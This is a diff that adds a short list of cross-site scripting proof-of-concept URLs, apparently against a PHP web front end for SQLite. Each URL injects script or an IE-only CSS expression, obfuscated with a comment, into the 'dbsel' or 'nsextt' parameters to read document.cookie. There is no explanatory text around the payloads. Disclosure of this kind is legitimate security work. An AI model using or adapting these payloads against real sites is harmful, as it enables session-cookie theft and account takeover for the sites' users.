@@ -1,0 +1,6 @@
+http://www.example.com/sqlite/main.php?dbsel=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+IE-only
+http://www.example.com/sqlite/?nsextt=&quot; stYle=&quot;x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?dbsel=&quot; stYle=&quot;x:expre/**/ssion(alert(document.cookie))
+http://www.example.com/sqlite/index.php?nsextt=&quot; stYle=&quot;x:expre/**/ssion(alert(document.cookie))
